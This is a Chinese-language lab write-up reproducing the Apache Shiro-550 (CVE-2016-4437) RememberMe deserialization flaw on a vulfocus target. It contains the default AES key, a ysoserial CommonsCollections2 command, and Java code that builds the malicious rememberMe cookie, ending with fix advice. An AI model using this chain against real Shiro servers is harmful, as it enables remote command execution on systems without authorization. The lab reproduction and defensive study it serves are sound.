# Shiro-550

## 漏洞原理

Shiro 框架提供了一个RememberMe功能，允许用户在下次访问时无需重新登录。这个功能通过在Cookie中设置一个rememberMe字段来实现。Shiro在处理rememberMe字段时，会先进行Base64解码，然后使用AES解密，最后反序列化。然而Shiro的默认AES密钥是硬编码在框架中的。

所以这使得攻击者可以轻易地构造一个恶意的序列化对象，将其AES加密并Base64编码后，作为rememberMe字段发送给Shiro服务端。在服务端接收Cookie后会检查RememberMe的值 -> Base64解码 -> 使用AES解密（加密密钥硬编码）-> 反序列化（未作过滤处理）

如果没有修改默认的密钥那么就很容易就知道密钥了，所以Payload构造起来就很简单。

## 复现

影响版本：Apache Shiro < 1.2.4

环境：使用vulfocus靶场
访问web页面

### ShiroAttack2一键利用

比较偷懒的做法，使用别人的工具梭哈就行了。
复制url直接点点点没啥说的。
[Shiro-550(自动化工具)](Shiro-550(自动化工具).md)
### ysoserial命令执行

进入页面看到有Remember Me功能，抓包看到响应中有rememberMe=deleteMe字段，如果出现rememberMe=deleteMe字段应该是仅仅能说明登录页面采用了shiro进行了身份验证而已，并非直接就说明存在漏洞。下面这篇博客写的也比较细，其漏洞验证流程也类似判断请求和响应包的字段，如下图：
![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/study-images/file-20241211203435922.png)
详细shiro漏洞复现及利用方法（CVE-2016-4437）_糊涂是福yyyy的博客-CSDN博客
![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/study-images/file-20241211203236510.png)
![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/study-images/file-20241211203249982.png)
使用Shiro_exploit工具爆破shiro密钥。

工具地址：https://github.com/insightglacier/Shiro_exploit

爆破成功：kPH+bIxk5D2deZiIxcaaaA==

![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/study-images/file-20241211203507190.png)

拿到key以后，利用 ysoserial 来生成反序列payload，ysoserial是一款用于生成利用不安全的Java对象反序列化的有效负载的概念验证工具。

下载地址：https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar

利用 ysoserial 的攻击，CommonsCollections2链子生成攻击文件

```bash
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections2 "touch /tmp/success" > poc.ser
```

预期结果应该是在/tmp目录下生成success文件，使用aes和base64加密将文件变成rememberMe字段，触发反序列化命令执行。

注意：需要使用jdk8的环境，需要引入shiro<1.2.4版本

pom.xml

```xml
        <dependency>
            <groupId>org.apache.shiro</groupId>
            <artifactId>shiro-core</artifactId>
            <version>1.2.3</version>
        </dependency>
```



文件：

```java
package shiro;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.codec.CodecSupport;
import org.apache.shiro.util.ByteSource;
import org.apache.shiro.codec.Base64;
import org.apache.shiro.io.DefaultSerializer;
import java.nio.file.FileSystems;
import java.nio.file.Files;
import java.nio.file.Paths;

public class shiro550 {
    public static void main(String[] args) throws Exception {
        byte[] payloads = Files.readAllBytes(FileSystems.getDefault().getPath("D:\\JavaDS\\代码\\CCTest\\src\\main\\java\\shiro\\poc.ser"));
        AesCipherService aes = new AesCipherService();
        byte[] key = Base64.decode(CodecSupport.toBytes("kPH+bIxk5D2deZiIxcaaaA=="));

        ByteSource ciphertext = aes.encrypt(payloads, key);
        System.out.println("rememberMe="+ciphertext.toString());
    }

}
```


使用生成的字段添加到cookie的最后，成功命令执行。
## 修复

Apache Shiro 1.2.5以下版本，建议升级shiro的版本，另一个修复建议就是将默认Key加密改为生成随机的Key加密。

## 踩坑

vulfocus靶场命令执行的时候使用的链子是cc2链子，网上博客大部分vulhub靶场使用cb1链子。

ysoserial工具使用太高版本的jdk会报错，将环境改成8。

生成字段的java文件中读取攻击文件要是用绝对路径。

